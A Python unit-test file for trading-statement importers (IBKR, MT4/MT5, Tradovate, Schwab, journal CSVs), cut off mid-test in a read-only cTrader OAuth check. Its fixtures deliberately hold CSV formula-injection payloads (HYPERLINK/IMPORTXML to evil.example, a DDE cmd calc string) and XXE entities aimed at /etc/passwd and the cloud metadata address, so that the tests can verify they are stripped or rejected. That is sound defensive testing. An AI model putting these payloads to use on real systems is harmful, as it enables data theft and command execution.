"""Comprehensive unit & adversarial security tests for Wave-4C Universal Importers.

Covers:
1. CSV formula-injection neutralization (`sanitize_csv_text_field`), 25 MB size caps
   (`MAX_STATEMENT_BYTES` / `StatementSizeLimitExceededError`), and pre-parse XXE / DTD /
   SYSTEM / PUBLIC rejection across UTF-8 and UTF-16 XML & HTML statements.
2. Zero-dropdown auto-detection (`detect_and_parse_statement` / `DetectedStatementResult`)
   across all 9 supported broker & journal formats purely in memory.
3. MetaTrader 4 & MetaTrader 5 FX/CFD/Prop HTML & UTF-16 CSV importers, exact commission +
   fee + tax + swap + profit accounting, and Demo/Contest server rejection.
4. Tradovate Futures `Performance`, `Orders`, and `Cash History` CSV importers across all
   12 CME/NYMEX/COMEX contract multipliers (`ES`, `MES`, `NQ`, `MNQ`, `CL`, `MCL`, `GC`,
   `MGC`, `YM`, `MYM`, `RTY`, `M2K`).
5. Spotware cTrader Open API Read-Only OAuth2 adapter (`CTraderReadOnlyOAuthAdapter`)
   pre-flight `Scope: ACCOUNTS` enforcement (`WriteCapableCredentialsRejectedError`),
   mutating `ProtoOA*Order*` / `ProtoOA*Position*` hard-blocks, and `isLive == False`
   demo rejection.
6. 1-Click TraderSync & TradeZella journal backup migration (`INSUFFICIENT_SECTIONS`)
   and guided IBKR Activity Flex Query setup template (`get_ibkr_flex_setup_guide`).
"""

from __future__ import annotations

import json
from typing import Any
import unittest

import n170_verify.connectors as connectors_pkg
from n170_verify.coaching.behaviour_metrics import (
    compute_behavioural_coaching_metrics,
    match_fifo_round_trips,
)
from n170_verify.connectors import (
    CONNECTOR_CLASS_MAP,
    CTRADER_BLOCKED_MUTATING_MESSAGE_TYPES,
    CTraderReadOnlyOAuthAdapter,
    DetectedStatementResult,
    DisallowedCapabilityError,
    FUTURES_POINT_MULTIPLIERS,
    IbkrFlexXmlSecurityError,
    JournalMigrationOfflineAdapter,
    JournalMigrationResult,
    MAX_STATEMENT_BYTES,
    Mt4OfflineStatementAdapter,
    Mt5OfflineStatementAdapter,
    PaperOrSandboxAccountRejectedError,
    REQUIRED_IBKR_FLEX_SECTIONS,
    SCOPE_ACCOUNTS,
    SCOPE_TRADING,
    StatementSizeLimitExceededError,
    StatementXmlHtmlSecurityError,
    TradovateOfflineCsvAdapter,
    UnsupportedScraperPolicyError,
    WriteCapableCredentialsRejectedError,
    compute_futures_roundtrip_pnl,
    create_connector,
    detect_and_parse_statement,
    get_connector_descriptor,
    get_ibkr_flex_setup_guide,
    list_all_connector_descriptors,
    list_connector_descriptors,
    parse_journal_migration_csv,
    parse_mt4_statement,
    parse_mt5_statement,
    parse_tradovate_csv,
    reject_xxe_and_dtd_declarations,
    resolve_futures_root_and_multiplier,
    sanitize_csv_text_field,
)
from n170_verify.contracts import (
    AccountScope,
    AssetClass,
    EnvironmentTier,
    FlowKind,
    OriginAssurance,
    ProviderApprovalState,
    ReconciliationStatus,
    validate_read_only_capabilities,
)
from n170_verify.reconciliation import reconcile_portfolio_ledger


TEST_SALT_HEX = "ef" * 32


def _synthetic_ibkr_flex_xml(account_id: str = "U8877665") -> str:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<FlexQueryResponse queryName="Universal Sniffer Test" type="AF">
  <FlexStatements count="1">
    <FlexStatement accountId="{account_id}" baseCurrency="USD" fromDate="2026-01-01" toDate="2026-01-31">
      <EquitySummaryInBase>
        <EquitySummaryByReportDateInBase reportDate="2026-01-02" cash="15000.00" stock="35000.00" total="50000.00" />
        <EquitySummaryByReportDateInBase reportDate="2026-01-30" cash="16200.00" stock="36800.00" total="53000.00" />
      </EquitySummaryInBase>
      <Trades>
        <Trade ibExecID="EX-100" symbol="AAPL" assetCategory="STK" buySell="BUY" quantity="25" tradePrice="200.00" currency="USD" ibCommission="-1.25" dateTime="2026-01-10;14:30:00" levelOfDetail="EXECUTION" />
      </Trades>
    </FlexStatement>
  </FlexStatements>
</FlexQueryResponse>
"""


def _synthetic_mt4_html(*, server: str = "ICMarketsSC-Live04", account_id: str = "50998877") -> str:
    return f"""<html>
<head><title>Statement: {account_id} - Live Trader</title></head>
<body>
<table>
  <tr><td><b>Account: {account_id}</b></td><td><b>Name: Jane Doe</b></td><td><b>Currency: USD</b></td><td><b>Server: {server}</b></td></tr>
  <tr><td colspan="14"><b>Closed Transactions:</b></td></tr>
  <tr>
    <td>Ticket</td><td>Open Time</td><td>Type</td><td>Size</td><td>Item</td>
    <td>Price</td><td>S / L</td><td>T / P</td><td>Close Time</td><td>Price</td>
    <td>Commission</td><td>Taxes</td><td>Swap</td><td>Profit</td>
  </tr>
  <tr>
    <td>10001</td><td>2026.01.02 08:00:00</td><td>balance</td>
    <td colspan="10">  =HYPERLINK("https://evil.example","Initial Wire Deposit")</td>
    <td>10 000.00</td>
  </tr>
  <tr>
    <td>10002</td><td>2026.01.05 09:15:00</td><td>buy</td><td>1.00</td><td>EURUSD</td>
    <td>1.08500</td><td>1.08000</td><td>1.09500</td><td>2026.01.06 14:30:00</td><td>1.09100</td>
    <td>-7.00</td><td>0.00</td><td>-1.50</td><td>600.00</td>
  </tr>
  <tr>
    <td>10003</td><td>2026.01.08 10:00:00</td><td>sell</td><td>0.50</td><td>XAUUSD</td>
    <td>2650.00</td><td>2665.00</td><td>2620.00</td><td>2026.01.08 16:45:00</td><td>2660.00</td>
    <td>-3.50</td><td>0.00</td><td>0.00</td><td>-500.00</td>
  </tr>
  <tr>
    <td>10004</td><td>2026.01.09 11:00:00</td><td>buy limit</td><td>1.00</td><td>GBPUSD</td>
    <td>1.25000</td><td>0.00000</td><td>0.00000</td><td>2026.01.09 18:00:00</td><td>1.25000</td>
    <td>0.00</td><td>0.00</td><td>0.00</td><td>0.00</td>
  </tr>
  <tr><td colspan="14"><b>Open Trades:</b></td></tr>
  <tr>
    <td>Ticket</td><td>Open Time</td><td>Type</td><td>Size</td><td>Item</td>
    <td>Price</td><td>S / L</td><td>T / P</td><td> </td><td>Price</td>
    <td>Commission</td><td>Taxes</td><td>Swap</td><td>Profit</td>
  </tr>
  <tr>
    <td>10005</td><td>2026.01.15 12:00:00</td><td>buy</td><td>0.20</td><td>GBPUSD</td>
    <td>1.26000</td><td>1.25500</td><td>1.27500</td><td> </td><td>1.26500</td>
    <td>-1.40</td><td>0.00</td><td>0.00</td><td>100.00</td>
  </tr>
  <tr><td colspan="14"><b>Summary:</b></td></tr>
  <tr><td>Deposit/Withdrawal:</td><td>10 000.00</td><td>Equity:</td><td>10 186.60</td></tr>
</table>
</body>
</html>
"""


def _synthetic_mt5_html(*, server: str = "FTMO-Server3", account_id: str = "77441122") -> str:
    return f"""<html>
<head><title>Trade History Report - MetaTrader 5</title></head>
<body>
<table>
  <tr><td>Account: {account_id} (USD, Live, Hedge)</td><td>Company: PropFirm Live</td><td>Server: {server}</td></tr>
  <tr><td>Orders</td></tr>
  <tr><td>Open Time</td><td>Order</td><td>Symbol</td><td>Type</td><td>Volume</td><td>Price</td><td>State</td></tr>
  <tr><td>2026.01.05 10:00:00</td><td>5001</td><td>EURUSD</td><td>buy</td><td>1.00 / 1.00</td><td>1.08000</td><td>filled</td></tr>
  <tr><td>Deals</td></tr>
  <tr>
    <td>Time</td><td>Deal</td><td>Symbol</td><td>Type</td><td>Direction</td>
    <td>Volume</td><td>Price</td><td>Order</td><td>Commission</td><td>Fee</td>
    <td>Swap</td><td>Profit</td><td>Balance</td><td>Comment</td>
  </tr>
  <tr>
    <td>2026.01.02 09:00:00</td><td>9000</td><td></td><td>balance</td><td></td>
    <td></td><td></td><td></td><td>0.00</td><td>0.00</td>
    <td>0.00</td><td>25 000.00</td><td>25 000.00</td><td>+cmd|'/C calc'!A0 Initial Funding</td>
  </tr>
  <tr>
    <td>2026.01.05 10:00:00</td><td>9001</td><td>EURUSD</td><td>buy</td><td>in</td>
    <td>1.00</td><td>1.08000</td><td>5001</td><td>-3.50</td><td>-0.50</td>
    <td>0.00</td><td>0.00</td><td>24 996.00</td><td>Entry Public Storage News</td>
  </tr>
  <tr>
    <td>2026.01.06 15:00:00</td><td>9002</td><td>EURUSD</td><td>sell</td><td>out</td>
    <td>1.00</td><td>1.08800</td><td>5002</td><td>-3.50</td><td>-0.50</td>
    <td>-2.00</td><td>800.00</td><td>25 790.00</td><td>Target Hit</td>
  </tr>
</table>
</body>
</html>
"""


class TestCsvFormulaInjectionAndXxeHardening(unittest.TestCase):
    def test_sanitize_csv_text_field_strips_all_formula_triggers_and_preserves_normal_text(self) -> None:
        adversarial_cases = [
            ('  =HYPERLINK("https://evil.example","Click")', 'HYPERLINK("https://evil.example","Click")'),
            ("+cmd|'/C calc'!A0", "cmd|'/C calc'!A0"),
            ("  -  @SUM(A1:A10)", "SUM(A1:A10)"),
            ("\t\r\n=IMPORTXML(\"https://evil.example\",\"//a\")", 'IMPORTXML("https://evil.example","//a")'),
            ("\xa0 +@=1+1", "1+1"),
            ("Clean Line\n=HYPERLINK(\"https://evil.example\")", 'Clean Line HYPERLINK("https://evil.example")'),
            ("==++--@@", ""),
            ("AAPL", "AAPL"),
            ("Vanguard S&P 500 - UCITS ETF", "Vanguard S&P 500 - UCITS ETF"),
        ]
        for raw_val, expected in adversarial_cases:
            result = sanitize_csv_text_field(raw_val)
            self.assertEqual(result, expected)
            if result:
                self.assertFalse(result[0] in {"=", "+", "-", "@", "\t", "\r", "\n", " "})

    def test_signed_negative_numbers_preserved_while_text_columns_neutralized(self) -> None:
        schwab_injected = (
            '"Date","Action","Symbol","Description","Quantity","Price","Fees & Comm","Amount"\n'
            '"01/04/2026","MoneyLink Deposit","","  =HYPERLINK(""http://evil"",""Deposit"")","","","","$10,000.00"\n'
            '"01/06/2026","MoneyLink Withdrawal","","+cmd|\'/C calc\'!A0","","","","-$125.50"\n'
            '"01/10/2026","Buy"," =AAPL","  @SUM(1,2) Apple Inc","10","$200.00","$1.50","-$2,001.50"\n'
        )
        res = detect_and_parse_statement(schwab_injected, blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(res.detected_format, "schwab_csv")
        self.assertEqual(len(res.ledger.flows), 2)
        # Signed negative withdrawal amount -125.50 is preserved intact as a float!
        withdrawal = next(f for f in res.ledger.flows if f.kind == FlowKind.WITHDRAWAL)
        self.assertAlmostEqual(withdrawal.amount, -125.50)
        self.assertFalse(withdrawal.description.startswith(("+", "=", "-", "@", " ")))
        deposit = next(f for f in res.ledger.flows if f.kind == FlowKind.DEPOSIT)
        self.assertFalse(deposit.description.startswith(("=", "+", "-", "@", " ")))
        self.assertEqual(res.ledger.trades[0].symbol, "AAPL")

    def test_max_statement_bytes_25mb_enforced_across_parsers(self) -> None:
        self.assertEqual(MAX_STATEMENT_BYTES, 25 * 1024 * 1024)
        oversized_bytes = b"A" * (MAX_STATEMENT_BYTES + 1)

        with self.assertRaises(StatementSizeLimitExceededError):
            detect_and_parse_statement(oversized_bytes, blinding_salt_hex=TEST_SALT_HEX)
        with self.assertRaises(StatementSizeLimitExceededError):
            parse_mt4_statement(oversized_bytes, blinding_salt_hex=TEST_SALT_HEX)
        with self.assertRaises(StatementSizeLimitExceededError):
            parse_mt5_statement(oversized_bytes, blinding_salt_hex=TEST_SALT_HEX)
        with self.assertRaises(StatementSizeLimitExceededError):
            parse_tradovate_csv(oversized_bytes, blinding_salt_hex=TEST_SALT_HEX)
        with self.assertRaises(StatementSizeLimitExceededError):
            parse_journal_migration_csv(oversized_bytes, blinding_salt_hex=TEST_SALT_HEX)

        # Bundle exceeding combined 25 MB also rejected
        half_plus = b"Date,Product,ISIN\n" + (b"x" * (MAX_STATEMENT_BYTES // 2 + 100))
        with self.assertRaises(StatementSizeLimitExceededError):
            detect_and_parse_statement(
                {"transactions_csv": half_plus, "account_csv": half_plus},
                blinding_salt_hex=TEST_SALT_HEX,
            )

    def test_xxe_dtd_system_and_public_entities_rejected_in_xml_and_html_utf8_and_utf16(self) -> None:
        xxe_payloads = [
            # 1. IBKR XML with SYSTEM external entity
            """<?xml version="1.0"?>
            <!DOCTYPE FlexQueryResponse [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <FlexQueryResponse>&xxe;</FlexQueryResponse>""",
            # 2. IBKR XML with PUBLIC external DTD
            """<?xml version="1.0"?>
            <!DOCTYPE FlexQueryResponse PUBLIC "-//N170//DTD//EN" "http://169.254.169.254/latest/meta-data">
            <FlexQueryResponse></FlexQueryResponse>""",
            # 3. MT4 HTML with DOCTYPE / ENTITY injection
            """<!DOCTYPE html SYSTEM "http://evil.example/xxe.dtd">
            <html><body><table><tr><td>Closed Transactions:</td></tr></table></body></html>""",
            # 4. MT5 HTML with ENTITY declaration
            """<html><!ENTITY leak PUBLIC "any" "file:///etc/hosts"><body><table><tr><td>Deals</td></tr></table></body></html>""",
        ]
        for payload in xxe_payloads:
            for enc in ("utf-8", "utf-16", "utf-16-le", "utf-16-be"):
                raw = payload.encode(enc)
                with self.assertRaises((StatementXmlHtmlSecurityError, IbkrFlexXmlSecurityError)):
                    reject_xxe_and_dtd_declarations(raw)
                with self.assertRaises((StatementXmlHtmlSecurityError, IbkrFlexXmlSecurityError)):
                    detect_and_parse_statement(raw, blinding_salt_hex=TEST_SALT_HEX)

        with self.assertRaises(StatementXmlHtmlSecurityError):
            parse_mt4_statement(xxe_payloads[2], blinding_salt_hex=TEST_SALT_HEX)
        with self.assertRaises(StatementXmlHtmlSecurityError):
            parse_mt5_statement(xxe_payloads[3], blinding_salt_hex=TEST_SALT_HEX)


class TestZeroDropdownStatementSniffer(unittest.TestCase):
    def test_detect_and_parse_statement_routes_all_nine_formats_accurately(self) -> None:
        # 1. IBKR Flex XML
        ibkr_res = detect_and_parse_statement(
            _synthetic_ibkr_flex_xml().encode("utf-8"),
            blinding_salt_hex=TEST_SALT_HEX,
        )
        self.assertEqual(ibkr_res.detected_format, "ibkr_flex_xml")
        self.assertEqual(ibkr_res.broker_id, "ibkr")
        self.assertEqual(ibkr_res.origin_assurance, OriginAssurance.SELF_REPORTED)
        self.assertIsNone(ibkr_res.reconciliation_status_override)
        self.assertEqual(
            DetectedStatementResult.from_dict(ibkr_res.to_dict()),
            ibkr_res,
        )

        # 2. DEGIRO CSV (single file & bundle)
        degiro_tx = (
            "Date,Time,Product,ISIN,Reference exchange,Venue,Quantity,Price,,Local value,,Value,,Exchange rate,Transaction and/or third,Total,,Order ID\n"
            "05-01-2026,15:35,APPLE INC,US0378331005,NDQ,XNAS,10,200.00,USD,-2000.00,USD,-1818.18,EUR,1.1000,-1.00,EUR,-1819.18,EUR,ORD-DG-1\n"
        )
        dg_res = detect_and_parse_statement(degiro_tx, blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(dg_res.detected_format, "degiro_csv")
        self.assertEqual(dg_res.broker_id, "degiro")
        self.assertEqual(dg_res.ledger.base_currency, "EUR")
        self.assertEqual(dg_res.ledger.trades[0].isin, "US0378331005")

        dg_bundle_res = detect_and_parse_statement(
            {"transactions_csv": degiro_tx},
            blinding_salt_hex=TEST_SALT_HEX,
        )
        self.assertEqual(dg_bundle_res.detected_format, "degiro_csv")

        # 3. Robinhood Activity CSV
        rh_csv = (
            "Activity Date,Process Date,Settle Date,Instrument,Description,Trans Code,Quantity,Price,Amount\n"
            "01/05/2026,01/05/2026,01/06/2026,MSFT,Microsoft Corp,Buy,5,$420.00,($2100.00)\n"
        )
        rh_res = detect_and_parse_statement(rh_csv, blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(rh_res.detected_format, "robinhood_csv")
        self.assertEqual(rh_res.broker_id, "robinhood")
        self.assertEqual(len(rh_res.ledger.trades), 1)

        # 4. Charles Schwab Transactions CSV
        schwab_csv = (
            '"Transactions for account Individual ...111 as of 01/31/2026"\n'
            '"Date","Action","Symbol","Description","Quantity","Price","Fees & Comm","Amount"\n'
            '"01/12/2026","Buy","SPY","SPDR S&P 500","10","$590.00","$0.00","-$5,900.00"\n'
        )
        sc_res = detect_and_parse_statement(schwab_csv, blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(sc_res.detected_format, "schwab_csv")
        self.assertEqual(sc_res.broker_id, "schwab")

        # 5. MetaTrader 4 HTML
        mt4_res = detect_and_parse_statement(_synthetic_mt4_html(), blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(mt4_res.detected_format, "mt4_statement")
        self.assertEqual(mt4_res.broker_id, "mt4")

        # 6. MetaTrader 5 HTML (UTF-16LE encoded, matching Windows MT5 terminal export)
        mt5_utf16 = _synthetic_mt5_html().encode("utf-16")
        mt5_res = detect_and_parse_statement(mt5_utf16, blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(mt5_res.detected_format, "mt5_statement")
        self.assertEqual(mt5_res.broker_id, "mt5")

        # 7. Tradovate Performance CSV
        tv_csv = (
            "symbol,buyFillId,sellFillId,qty,buyPrice,sellPrice,pnl,boughtTimestamp,soldTimestamp\n"
            "ESH6,BF-1,SF-1,2,5800.00,5812.50,$1250.00,01/15/2026 09:35:00,01/15/2026 10:15:00\n"
        )
        tv_res = detect_and_parse_statement(tv_csv, blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(tv_res.detected_format, "tradovate_csv")
        self.assertEqual(tv_res.broker_id, "tradovate")

        # 8. TraderSync Journal CSV
        ts_csv = (
            "Status,Symbol,Size,Open Date,Open Time,Close Date,Close Time,Entry Price,Exit Price,Return $,Side,Setups,Mistakes,Commission,Notes\n"
            "WIN,NVDA,50,2026-01-08,09:35:00,2026-01-08,10:20:00,140.00,145.00,248.00,LONG,ORB Breakout; =VWAP Reclaim,+FOMO Entry,2.00,  @Held runner cleanly\n"
        )
        ts_res = detect_and_parse_statement(ts_csv, blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(ts_res.detected_format, "tradersync_journal")
        self.assertEqual(ts_res.broker_id, "tradersync")
        self.assertEqual(
            ts_res.reconciliation_status_override,
            ReconciliationStatus.INSUFFICIENT_SECTIONS,
        )
        self.assertEqual(ts_res.imported_journal_tags, ["ORB Breakout", "VWAP Reclaim", "FOMO Entry"])

        # 9. TradeZella Journal CSV
        tz_csv = (
            "Open Date,Close Date,Symbol,Side,Volume,Entry Price,Exit Price,Net P&L,Commissions,Playbook,Mistake Tags,R-Multiple,Notes\n"
            "2026-01-14 14:30:00,2026-01-14 15:45:00,NQH6,Short,2,21200.00,21150.00,$1992.00,8.00,Opening Drive,-Early Exit,2.4,  =Clean fade\n"
        )
        tz_res = detect_and_parse_statement(tz_csv, blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(tz_res.detected_format, "tradezella_journal")
        self.assertEqual(tz_res.broker_id, "tradezella")
        self.assertEqual(
            tz_res.reconciliation_status_override,
            ReconciliationStatus.INSUFFICIENT_SECTIONS,
        )
        self.assertEqual(tz_res.imported_journal_tags, ["Opening Drive", "Early Exit"])

    def test_sniffer_rejects_empty_unrecognized_and_scraper_credentials(self) -> None:
        with self.assertRaises(ValueError):
            detect_and_parse_statement("", blinding_salt_hex=TEST_SALT_HEX)
        with self.assertRaises(ValueError):
            detect_and_parse_statement("foo,bar,baz\n1,2,3\n", blinding_salt_hex=TEST_SALT_HEX)
        with self.assertRaises(ValueError):
            detect_and_parse_statement("<html><body><p>Random blog</p></body></html>", blinding_salt_hex=TEST_SALT_HEX)
        with self.assertRaises(UnsupportedScraperPolicyError):
            detect_and_parse_statement("Date,Action\n", password="secret")


class TestMt4Mt5AndTradovateImporters(unittest.TestCase):
    def test_mt4_html_and_csv_accounting_demo_rejection_and_account_blinding(self) -> None:
        mt4_ledger = Mt4OfflineStatementAdapter().parse_export(
            _synthetic_mt4_html(server="ICMarketsSC-Live04", account_id="50998877"),
            blinding_salt_hex=TEST_SALT_HEX,
        )
        self.assertEqual(mt4_ledger.claimed_origin_assurance, OriginAssurance.SELF_REPORTED)
        self.assertEqual(mt4_ledger.account_scope, AccountScope.UNKNOWN_OFFLINE_SCOPE)
        self.assertEqual(mt4_ledger.environment_tier, EnvironmentTier.LIVE_PRODUCTION)

        # Raw account number 50998877 is strictly blinded
        serialized = json.dumps(mt4_ledger.to_dict())
        self.assertNotIn("50998877", serialized)

        # 2 closed round-trips (EURUSD buy, XAUUSD sell) -> 4 execution legs; canceled 'buy limit' skipped
        self.assertEqual(len(mt4_ledger.trades), 4)
        eur_open = next(t for t in mt4_ledger.trades if t.symbol == "EURUSD" and t.side == "buy")
        self.assertEqual(eur_open.asset_class, AssetClass.FX)
        self.assertEqual(eur_open.multiplier, 100_000.0)
        self.assertAlmostEqual(eur_open.notional_base, 108_500.0)

        # Deposit flow (sanitized of leading '=HYPERLINK') + overnight swap (-1.50)
        self.assertEqual(len(mt4_ledger.flows), 2)
        dep = next(f for f in mt4_ledger.flows if f.kind == FlowKind.DEPOSIT)
        self.assertAlmostEqual(dep.amount, 10_000.0)
        self.assertFalse(dep.description.startswith("="))
        swap = next(f for f in mt4_ledger.flows if f.kind == FlowKind.MARGIN_INTEREST)
        self.assertAlmostEqual(swap.amount, -1.50)

        # Open Trades parsed into ending_positions (GBPUSD 0.20 lot)
        self.assertEqual(len(mt4_ledger.ending_positions), 1)
        self.assertAlmostEqual(mt4_ledger.ending_positions[0].quantity, 0.20)
        # Final Summary Equity anchored at 10186.60
        self.assertAlmostEqual(mt4_ledger.nav_points[-1].nav_base, 10_186.60)

        # Demo/Contest server rejected when reject_demo=True, flagged when reject_demo=False
        demo_html = _synthetic_mt4_html(server="MetaQuotes-Demo", account_id="99112233")
        with self.assertRaises(PaperOrSandboxAccountRejectedError):
            parse_mt4_statement(demo_html, blinding_salt_hex=TEST_SALT_HEX, reject_demo=True)
        flagged = parse_mt4_statement(demo_html, blinding_salt_hex=TEST_SALT_HEX, reject_demo=False)
        self.assertEqual(flagged.environment_tier, EnvironmentTier.PAPER_OR_SANDBOX_REJECTED)

        # MT4 CSV export support
        mt4_csv = (
            "Ticket,Open Time,Type,Size,Item,Price,S / L,T / P,Close Time,Price,Commission,Taxes,Swap,Profit\n"
            "2001,2026.01.03 09:00:00,balance,,,,,,,,,,,"
            ",5000.00\n"
            "2002,2026.01.04 10:00:00,buy,0.50,EURUSD,1.1000,1.0950,1.1100,2026.01.04 15:00:00,1.1040,-3.50,0.00,0.00,200.00\n"
        )
        mt4_csv_ledger = parse_mt4_statement(mt4_csv, blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(len(mt4_csv_ledger.trades), 2)
        self.assertAlmostEqual(mt4_csv_ledger.nav_points[-1].nav_base, 5196.50)

    def test_mt5_html_and_utf16_csv_deals_commission_fee_swap_profit_accounting(self) -> None:
        mt5_ledger = Mt5OfflineStatementAdapter().parse_export(
            _synthetic_mt5_html().encode("utf-16-le"),
            blinding_salt_hex=TEST_SALT_HEX,
        )
        self.assertEqual(mt5_ledger.claimed_origin_assurance, OriginAssurance.SELF_REPORTED)
        self.assertEqual(mt5_ledger.account_scope, AccountScope.UNKNOWN_OFFLINE_SCOPE)
        self.assertEqual(len(mt5_ledger.trades), 2)
        # Each deal had Commission=-3.50 and Fee=-0.50 -> combined commission=4.00 per leg
        self.assertAlmostEqual(mt5_ledger.trades[0].commission, 4.00)
        self.assertAlmostEqual(mt5_ledger.trades[1].commission, 4.00)
        # Balance deposit (+25000, sanitized of '+cmd|') + Swap (-2.00)
        self.assertEqual(len(mt5_ledger.flows), 2)
        dep = next(f for f in mt5_ledger.flows if f.kind == FlowKind.DEPOSIT)
        self.assertFalse(dep.description.startswith("+"))
        # Final balance: 25000 - 4.00 + (800 - 4.00 - 2.00) = 25790.00
        self.assertAlmostEqual(mt5_ledger.nav_points[-1].nav_base, 25_790.00)
        self.assertNotIn("77441122", json.dumps(mt5_ledger.to_dict()))

        # MT5 Demo server rejected
        with self.assertRaises(PaperOrSandboxAccountRejectedError):
            parse_mt5_statement(
                _synthetic_mt5_html(server="FTMO-Demo"),
                blinding_salt_hex=TEST_SALT_HEX,
                reject_demo=True,
            )

        # MT5 tab-delimited UTF-16 CSV export
        mt5_tsv = (
            "Time\tDeal\tSymbol\tType\tDirection\tVolume\tPrice\tOrder\tCommission\tFee\tSwap\tProfit\tBalance\tComment\n"
            "2026.01.02 08:00:00\t1\t\tbalance\t\t\t\t\t0.00\t0.00\t0.00\t15000.00\t15000.00\tDeposit\n"
            "2026.01.03 09:00:00\t2\tMESZ5\tbuy\tin\t2\t5800.00\t10\t-1.20\t-0.30\t0.00\t0.00\t14998.50\tOpen\n"
            "2026.01.03 11:00:00\t3\tMESZ5\tsell\tout\t2\t5810.00\t11\t-1.20\t-0.30\t0.00\t100.00\t15097.00\tClose\n"
        ).encode("utf-16")
        mt5_tsv_ledger = parse_mt5_statement(mt5_tsv, blinding_salt_hex=TEST_SALT_HEX)
        self.assertEqual(mt5_tsv_ledger.trades[0].asset_class, AssetClass.FUTURE)
        self.assertEqual(mt5_tsv_ledger.trades[0].multiplier, 5.0)
        self.assertAlmostEqual(mt5_tsv_ledger.nav_points[-1].nav_base, 15_097.00)

    def test_tradovate_all_12_futures_multipliers_notional_short_roundtrips_and_demo_rejection(self) -> None:
        expected_contracts = [
            ("ESH6", "ES", 50.0),
            ("MESZ5", "MES", 5.0),
            ("NQM26", "NQ", 20.0),
            ("MNQU26", "MNQ", 2.0),
            ("CLJ6", "CL", 1000.0),
            ("MCLN25", "MCL", 100.0),
            ("GCZ6", "GC", 100.0),
            ("MGCQ26", "MGC", 10.0),
            ("YMH6", "YM", 5.0),
            ("MYMZ5", "MYM", 0.5),
            ("RTYU6", "RTY", 50.0),
            ("M2KH6", "M2K", 5.0),
        ]
        self.assertEqual(len(FUTURES_POINT_MULTIPLIERS), 12)
        for contract, expected_root, expected_mult in expected_contracts:
            root, mult = resolve_futures_root_and_multiplier(contract)
            self.assertEqual(root, expected_root)
            self.assertEqual(mult, expected_mult)

        # Performance CSV with both a LONG ESH6 trade (+10 pts * 2 * $50 = +$1000)
        # and a SHORT NQM26 trade (soldTimestamp < boughtTimestamp: sold 21000, bought 21025 -> -25 * 1 * $20 = -$500)
        perf_csv = (
            "symbol,buyFillId,sellFillId,qty,buyPrice,sellPrice,pnl,boughtTimestamp,soldTimestamp\n"
            "ESH6,BF-ES,SF-ES,2,5800.00,5810.00,$1000.00,01/12/2026 09:31:00,01/12/2026 10:05:00\n"
            "NQM26,BF-NQ,SF-NQ,1,21025.00,21000.00,$(500.00),01/13/2026 11:15:00,01/13/2026 10:45:00\n"
        )
        cash_csv = (
            "Account,Timestamp,Currency,Cash Change Type,Delta,Cash Balance,Comment\n"
            "LIVE889900,2026-01-10 08:00:00,USD,Deposit,25000.00,25000.00,Wire In\n"
            "LIVE889900,2026-01-12 10:05:00,USD,Trade Paired,1000.00,26000.00,ESH6 Realized\n"
            "LIVE889900,2026-01-12 10:05:01,USD,Commission,-8.40,25991.60,Exchange & NFA Fees\n"
            "LIVE889900,2026-01-13 11:15:00,USD,Trade Paired,-500.00,25491.60,NQM26 Realized\n"
        )
        ledger = TradovateOfflineCsvAdapter().parse_export(
            {"performance_csv": perf_csv, "cash_history_csv": cash_csv},
            blinding_salt_hex=TEST_SALT_HEX,
        )
        self.assertEqual(ledger.claimed_origin_assurance, OriginAssurance.SELF_REPORTED)
        self.assertEqual(ledger.account_scope, AccountScope.UNKNOWN_OFFLINE_SCOPE)
        self.assertEqual(len(ledger.trades), 4)
        self.assertNotIn("LIVE889900", json.dumps(ledger.to_dict()))

        es_buy = next(t for t in ledger.trades if t.symbol == "ESH6" and t.side == "buy")
        self.assertEqual(es_buy.multiplier, 50.0)
        self.assertEqual(es_buy.underlying_symbol, "ES")
        self.assertAlmostEqual(es_buy.notional_base, 2 * 5800.0 * 50.0)
        self.assertAlmostEqual(compute_futures_roundtrip_pnl("ESH6", 5800.0, 5810.0, 2), 1000.0)
        self.assertAlmostEqual(compute_futures_roundtrip_pnl("NQM26", 21025.0, 21000.0, 1), -500.0)

        # Verify downstream FIFO coaching matches both the LONG ESH6 (+1000) and SHORT NQM26 (-500) accurately!
        metrics = compute_behavioural_coaching_metrics(ledger)
        closed_rts = match_fifo_round_trips(ledger)
        self.assertEqual(metrics.observed_trades, 2)
        self.assertEqual(len(closed_rts), 2)
        self.assertEqual({rt.side for rt in closed_rts}, {"long", "short"})
        nq_rt = next(rt for rt in closed_rts if rt.symbol == "NQM26")
        self.assertEqual(nq_rt.side, "short")
        self.assertAlmostEqual(nq_rt.gross_pnl_base, -500.0)

        # Orders CSV mode skips Canceled rows and rejects DEMO accounts
        orders_demo_csv = (
            "orderId,Account,B/S,Contract,avgPrice,filledQty,Fill Time,Status\n"
            "101,DEMO554433,Buy,M2KH6,2250.00,3,2026-01-15 14:30:00,Filled\n"
            "102,DEMO554433,Sell,M2KH6,2260.00,0,2026-01-15 14:35:00,Canceled\n"
        )
        with self.assertRaises(PaperOrSandboxAccountRejectedError):
            parse_tradovate_csv(orders_demo_csv, blinding_salt_hex=TEST_SALT_HEX, reject_demo=True)
        demo_allowed = parse_tradovate_csv(
            orders_demo_csv, blinding_salt_hex=TEST_SALT_HEX, reject_demo=False
        )
        self.assertEqual(demo_allowed.environment_tier, EnvironmentTier.PAPER_OR_SANDBOX_REJECTED)
        self.assertEqual(len(demo_allowed.trades), 1)
        self.assertEqual(demo_allowed.trades[0].multiplier, 5.0)
        self.assertEqual(demo_allowed.trades[0].underlying_symbol, "M2K")


class TestCTraderReadOnlyOAuthAdapter(unittest.TestCase):
    def test_rejects_trading_scope_before_any_account_call_and_blocks_all_mutating_messages(self) -> None:
        calls: list[str] = []

        def tracking_transport(msg_type: str, _payload: dict[str, Any]) -> dict[str, Any]:
            calls.append(msg_type)
            return {}

        for bad_scope in (
            SCOPE_TRADING,
            "accounts trading",
            ["accounts", "trading"],
            "SCOPE_TRADE",
            "orders",
            "write",
            1,
            "",
        ):
